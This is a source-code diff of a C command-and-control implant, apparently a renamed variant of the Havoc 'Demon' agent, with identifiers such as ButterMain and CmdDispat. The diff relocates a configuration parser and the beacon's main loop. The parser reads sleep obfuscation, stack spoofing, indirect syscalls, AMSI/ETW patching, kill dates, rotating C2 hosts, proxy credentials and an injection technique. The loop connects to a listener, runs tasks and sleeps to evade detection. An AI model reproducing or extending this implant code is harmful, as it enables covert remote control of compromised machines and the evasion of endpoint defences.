@@ -35,6 +35,226 @@ int not_lol = 67;
  * 4. Enter main connecting and tasking routine
  *
  */
+
+ VOID DemonConfig()
+{
+    PARSER Parser = { 0 };
+    PVOID  Buffer = NULL;
+    ULONG  Temp   = 0;
+    UINT32 Length = 0;
+    DWORD  J      = 0;
+
+    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
+
+    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
+    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
+
+    Instance->Config.Sleeping = ParserGetInt32( &Parser );
+    Instance->Config.Jitter   = ParserGetInt32( &Parser );
+    PRINTF( "Sleep: %d (%d%%)\n", Instance->Config.Sleeping, Instance->Config.Jitter )
+
+    Instance->Config.Memory.Alloc   = ParserGetInt32( &Parser );
+    Instance->Config.Memory.Execute = ParserGetInt32( &Parser );
+
+    PRINTF(
+        "[CONFIG] Memory: \n"
+        " - Allocate: %d  \n"
+        " - Execute : %d  \n",
+        Instance->Config.Memory.Alloc,
+        Instance->Config.Memory.Execute
+    )
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Length );
+    MemCopy( Instance->Config.Process.Spawn64, Buffer, Length );
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Length );
+    MemCopy( Instance->Config.Process.Spawn86, Buffer, Length );
+
+    PRINTF(
+        "[CONFIG] Spawn: \n"
+        " - [x64] => %ls  \n"
+        " - [x86] => %ls  \n",
+        Instance->Config.Process.Spawn64,
+        Instance->Config.Process.Spawn86
+    )
+
+    Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
+    Instance->Config.Implant.SleepJmpBypass     = ParserGetInt32( &Parser );
+    Instance->Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
+    Instance->Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
+    Instance->Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
+    Instance->Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
+#ifdef TRANSPORT_HTTP
+    Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
+#else
+    Instance->Config.Implant.DownloadChunkSize  = 0xfc00; /* 63k, needs to be less than PIPE_BUFFER_MAX */
+#endif
+
+    PRINTF(
+        "[CONFIG] Sleep Obfuscation: \n"
+        " - Technique: %d \n"
+        " - Stack Dup: %s \n"
+        "[CONFIG] ProxyLoading: %d\n"
+        "[CONFIG] SysIndirect : %s\n"
+        "[CONFIG] AmsiEtwPatch: %d\n",
+        Instance->Config.Implant.SleepMaskTechnique,
+        Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
+        Instance->Config.Implant.ProxyLoading,
+        Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
+        Instance->Config.Implant.AmsiEtwPatch
+    )
+
+#ifdef TRANSPORT_HTTP
+    Instance->Config.Transport.KillDate       = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+    // check if the kill date has already passed
+    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
+    {
+        // refuse to run
+        // TODO: exit process?
+        Instance->Win32.RtlExitUserThread( 0 );
+    }
+    Instance->Config.Transport.WorkingHours   = ParserGetInt32( &Parser );
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.Method = MmHeapAlloc( Length + sizeof( WCHAR ) );
+    MemCopy( Instance->Config.Transport.Method, Buffer, Length );
+
+    Instance->Config.Transport.HostRotation   = ParserGetInt32( &Parser );
+    Instance->Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
+                                                    * TODO: add this to the yaotl language and listener GUI */
+    Instance->Config.Transport.Hosts = NULL;
+    Instance->Config.Transport.Host  = NULL;
+
+    /* J contains our Hosts counter */
+    J = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
+    for ( int i = 0; i < J; i++ )
+    {
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Temp   = ParserGetInt32( &Parser );
+
+        PRINTF( " - %ls:%ld\n", Buffer, Temp )
+
+        /* if our host address is longer than 0 then lets use it. */
+        if ( Length > 0 ) {
+            /* Add parse host data to our linked list */
+            HostAdd( Buffer, Length, Temp );
+        }
+    }
+    Instance->Config.Transport.NumHosts = HostCount();
+    PRINTF( "Hosts added => %d\n", Instance->Config.Transport.NumHosts )
+
+    /* Get Host data based on our host rotation strategy */
+    Instance->Config.Transport.Host = HostRotation( Instance->Config.Transport.HostRotation );
+    PRINTF( "Host going to be used is => %ls:%ld\n", Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port )
+
+    // Listener Secure (SSL)
+    Instance->Config.Transport.Secure = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] Secure: %s\n", Instance->Config.Transport.Secure ? "TRUE" : "FALSE" );
+
+    // UserAgent
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.UserAgent = MmHeapAlloc( Length + sizeof( WCHAR ) );
+    MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
+    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );
+
+    // Headers
+    J = ParserGetInt32( &Parser );
+    Instance->Config.Transport.Headers = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    PRINTF( "[CONFIG] Headers [%d]:\n", J );
+    for ( INT i = 0; i < J; i++ )
+    {
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.Headers[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
+        MemSet( Instance->Config.Transport.Headers[ i ], 0, Length );
+        MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
+#ifdef DEBUG
+        PRINTF( "  - %ls\n", Instance->Config.Transport.Headers[ i ] );
+#endif
+    }
+    Instance->Config.Transport.Headers[ J + 1 ] = NULL;
+
+    // Uris
+    J = ParserGetInt32( &Parser );
+    Instance->Config.Transport.Uris = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
+    PRINTF( "[CONFIG] Uris [%d]:\n", J );
+    for ( INT i = 0; i < J; i++ )
+    {
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.Uris[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
+        MemSet( Instance->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
+#ifdef DEBUG
+        PRINTF( "  - %ls\n", Instance->Config.Transport.Uris[ i ] );
+#endif
+    }
+    Instance->Config.Transport.Uris[ J + 1 ] = NULL;
+
+    // check if proxy connection is enabled
+    Instance->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
+    if ( Instance->Config.Transport.Proxy.Enabled )
+    {
+        STUP( "[CONFIG] [PROXY] Enabled" );
+        Buffer = ParserGetBytes( &Parser, &Length );
+        Instance->Config.Transport.Proxy.Url = MmHeapAlloc( Length + sizeof( WCHAR ) );
+        MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
+        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );
+
+        Buffer = ParserGetBytes( &Parser, &Length );
+        if ( Length > 0 )
+        {
+            Instance->Config.Transport.Proxy.Username = MmHeapAlloc( Length );
+            MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
+            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
+        }
+        else
+            Instance->Config.Transport.Proxy.Username = NULL;
+
+        Buffer = ParserGetBytes( &Parser, &Length );
+        if ( Length > 0 )
+        {
+            Instance->Config.Transport.Proxy.Password = MmHeapAlloc( Length );
+            MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
+            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
+        }
+        else
+            Instance->Config.Transport.Proxy.Password = NULL;
+    }
+    else
+    {
+        STUP( "[CONFIG] [PROXY] Disabled" );
+    }
+#endif
+
+#ifdef TRANSPORT_SMB
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length );
+    MemCopy( Instance->Config.Transport.Name, Buffer, Length );
+
+    PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );
+
+    Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+    // check if the kill date has already passed
+    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
+    {
+        // refuse to run
+        // TODO: exit process?
+        Instance->Win32.RtlExitUserThread(0);
+    }
+    Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
+#endif
+
+    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
+    Instance->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
+
+    ParserDestroy( &Parser );
+}
+
 VOID ButterMain( PVOID ModInst, PKAYN_ARGS KArgs )
 {
     int pew = lol + not_lol;
@@ -72,36 +292,7 @@ VOID ButterMain( PVOID ModInst, PKAYN_ARGS KArgs )
  *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
  * 3. Sleep Obfuscation. After that lets try to connect to the listener again
  */
-_Noreturn
-VOID ButterRou()
-{
-    /* the main loop */
-    for ( ;; )
-    {
-        /* if we aren't connected then lets connect to our host */
-        if ( ! Instance->Session.Connected )
-        {
-            /* Connect to our listener */
-            if ( TranIn() )
-            {
 
-#ifdef TRANSPORT_HTTP
-                /* reset the failure counter since we managed to connect to it. */
-                Instance->Config.Transport.Host->Failures = 0;
-#endif
-            }
-        }
-
-        if ( Instance->Session.Connected )
-        {
-            /* Enter tasking routine */
-            CmdDispat();
-        }
-
-        /* Sleep for a while (with encryption if specified) */
-        EepOb();
-    }
-}
 
 /* Init metadata buffer/package. */
 VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )
@@ -275,6 +466,39 @@ VOID ButterMeDat( PPACKAGE* metdat, BOOL Header )
     PackageAddInt64( *metdat, Instance->Config.Transport.KillDate );
     PkgAdIn32( *metdat, Instance->Config.Transport.WorkingHours );
 }
+
+_Noreturn
+VOID ButterRou()
+{
+    /* the main loop */
+    for ( ;; )
+    {
+        /* if we aren't connected then lets connect to our host */
+        if ( ! Instance->Session.Connected )
+        {
+            /* Connect to our listener */
+            if ( TranIn() )
+            {
+
+#ifdef TRANSPORT_HTTP
+                /* reset the failure counter since we managed to connect to it. */
+                Instance->Config.Transport.Host->Failures = 0;
+#endif
+            }
+        }
+
+        if ( Instance->Session.Connected )
+        {
+            /* Enter tasking routine */
+            CmdDispat();
+        }
+
+        /* Sleep for a while (with encryption if specified) */
+        EepOb();
+    }
+}
+
+
 
 VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
 {
@@ -580,223 +804,4 @@ VOID ButterInit( PVOID ModInst, PKAYN_ARGS KArgs )
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
-}
-
-VOID DemonConfig()
-{
-    PARSER Parser = { 0 };
-    PVOID  Buffer = NULL;
-    ULONG  Temp   = 0;
-    UINT32 Length = 0;
-    DWORD  J      = 0;
-
-    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
-
-    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
-    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
-
-    Instance->Config.Sleeping = ParserGetInt32( &Parser );
-    Instance->Config.Jitter   = ParserGetInt32( &Parser );
-    PRINTF( "Sleep: %d (%d%%)\n", Instance->Config.Sleeping, Instance->Config.Jitter )
-
-    Instance->Config.Memory.Alloc   = ParserGetInt32( &Parser );
-    Instance->Config.Memory.Execute = ParserGetInt32( &Parser );
-
-    PRINTF(
-        "[CONFIG] Memory: \n"
-        " - Allocate: %d  \n"
-        " - Execute : %d  \n",
-        Instance->Config.Memory.Alloc,
-        Instance->Config.Memory.Execute
-    )
-
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Process.Spawn64 = Instance->Win32.LocalAlloc( LPTR, Length );
-    MemCopy( Instance->Config.Process.Spawn64, Buffer, Length );
-
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Length );
-    MemCopy( Instance->Config.Process.Spawn86, Buffer, Length );
-
-    PRINTF(
-        "[CONFIG] Spawn: \n"
-        " - [x64] => %ls  \n"
-        " - [x86] => %ls  \n",
-        Instance->Config.Process.Spawn64,
-        Instance->Config.Process.Spawn86
-    )
-
-    Instance->Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
-    Instance->Config.Implant.SleepJmpBypass     = ParserGetInt32( &Parser );
-    Instance->Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
-    Instance->Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
-    Instance->Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
-    Instance->Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
-#ifdef TRANSPORT_HTTP
-    Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
-#else
-    Instance->Config.Implant.DownloadChunkSize  = 0xfc00; /* 63k, needs to be less than PIPE_BUFFER_MAX */
-#endif
-
-    PRINTF(
-        "[CONFIG] Sleep Obfuscation: \n"
-        " - Technique: %d \n"
-        " - Stack Dup: %s \n"
-        "[CONFIG] ProxyLoading: %d\n"
-        "[CONFIG] SysIndirect : %s\n"
-        "[CONFIG] AmsiEtwPatch: %d\n",
-        Instance->Config.Implant.SleepMaskTechnique,
-        Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
-        Instance->Config.Implant.ProxyLoading,
-        Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
-        Instance->Config.Implant.AmsiEtwPatch
-    )
-
-#ifdef TRANSPORT_HTTP
-    Instance->Config.Transport.KillDate       = ParserGetInt64( &Parser );
-    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
-    // check if the kill date has already passed
-    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
-    {
-        // refuse to run
-        // TODO: exit process?
-        Instance->Win32.RtlExitUserThread( 0 );
-    }
-    Instance->Config.Transport.WorkingHours   = ParserGetInt32( &Parser );
-
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.Method = MmHeapAlloc( Length + sizeof( WCHAR ) );
-    MemCopy( Instance->Config.Transport.Method, Buffer, Length );
-
-    Instance->Config.Transport.HostRotation   = ParserGetInt32( &Parser );
-    Instance->Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
-                                                    * TODO: add this to the yaotl language and listener GUI */
-    Instance->Config.Transport.Hosts = NULL;
-    Instance->Config.Transport.Host  = NULL;
-
-    /* J contains our Hosts counter */
-    J = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
-    for ( int i = 0; i < J; i++ )
-    {
-        Buffer = ParserGetBytes( &Parser, &Length );
-        Temp   = ParserGetInt32( &Parser );
-
-        PRINTF( " - %ls:%ld\n", Buffer, Temp )
-
-        /* if our host address is longer than 0 then lets use it. */
-        if ( Length > 0 ) {
-            /* Add parse host data to our linked list */
-            HostAdd( Buffer, Length, Temp );
-        }
-    }
-    Instance->Config.Transport.NumHosts = HostCount();
-    PRINTF( "Hosts added => %d\n", Instance->Config.Transport.NumHosts )
-
-    /* Get Host data based on our host rotation strategy */
-    Instance->Config.Transport.Host = HostRotation( Instance->Config.Transport.HostRotation );
-    PRINTF( "Host going to be used is => %ls:%ld\n", Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port )
-
-    // Listener Secure (SSL)
-    Instance->Config.Transport.Secure = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Secure: %s\n", Instance->Config.Transport.Secure ? "TRUE" : "FALSE" );
-
-    // UserAgent
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.UserAgent = MmHeapAlloc( Length + sizeof( WCHAR ) );
-    MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
-    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );
-
-    // Headers
-    J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Headers = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
-    PRINTF( "[CONFIG] Headers [%d]:\n", J );
-    for ( INT i = 0; i < J; i++ )
-    {
-        Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Headers[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
-        MemSet( Instance->Config.Transport.Headers[ i ], 0, Length );
-        MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
-#ifdef DEBUG
-        PRINTF( "  - %ls\n", Instance->Config.Transport.Headers[ i ] );
-#endif
-    }
-    Instance->Config.Transport.Headers[ J + 1 ] = NULL;
-
-    // Uris
-    J = ParserGetInt32( &Parser );
-    Instance->Config.Transport.Uris = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
-    PRINTF( "[CONFIG] Uris [%d]:\n", J );
-    for ( INT i = 0; i < J; i++ )
-    {
-        Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Uris[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
-        MemSet( Instance->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
-        MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
-#ifdef DEBUG
-        PRINTF( "  - %ls\n", Instance->Config.Transport.Uris[ i ] );
-#endif
-    }
-    Instance->Config.Transport.Uris[ J + 1 ] = NULL;
-
-    // check if proxy connection is enabled
-    Instance->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
-    if ( Instance->Config.Transport.Proxy.Enabled )
-    {
-        STUP( "[CONFIG] [PROXY] Enabled" );
-        Buffer = ParserGetBytes( &Parser, &Length );
-        Instance->Config.Transport.Proxy.Url = MmHeapAlloc( Length + sizeof( WCHAR ) );
-        MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
-        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );
-
-        Buffer = ParserGetBytes( &Parser, &Length );
-        if ( Length > 0 )
-        {
-            Instance->Config.Transport.Proxy.Username = MmHeapAlloc( Length );
-            MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
-            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
-        }
-        else
-            Instance->Config.Transport.Proxy.Username = NULL;
-
-        Buffer = ParserGetBytes( &Parser, &Length );
-        if ( Length > 0 )
-        {
-            Instance->Config.Transport.Proxy.Password = MmHeapAlloc( Length );
-            MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
-            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
-        }
-        else
-            Instance->Config.Transport.Proxy.Password = NULL;
-    }
-    else
-    {
-        STUP( "[CONFIG] [PROXY] Disabled" );
-    }
-#endif
-
-#ifdef TRANSPORT_SMB
-
-    Buffer = ParserGetBytes( &Parser, &Length );
-    Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length );
-    MemCopy( Instance->Config.Transport.Name, Buffer, Length );
-
-    PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );
-
-    Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
-    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
-    // check if the kill date has already passed
-    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
-    {
-        // refuse to run
-        // TODO: exit process?
-        Instance->Win32.RtlExitUserThread(0);
-    }
-    Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
-#endif
-
-    Instance->Config.Implant.ThreadStartAddr = Instance->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
-    Instance->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;
-
-    ParserDestroy( &Parser );
 }
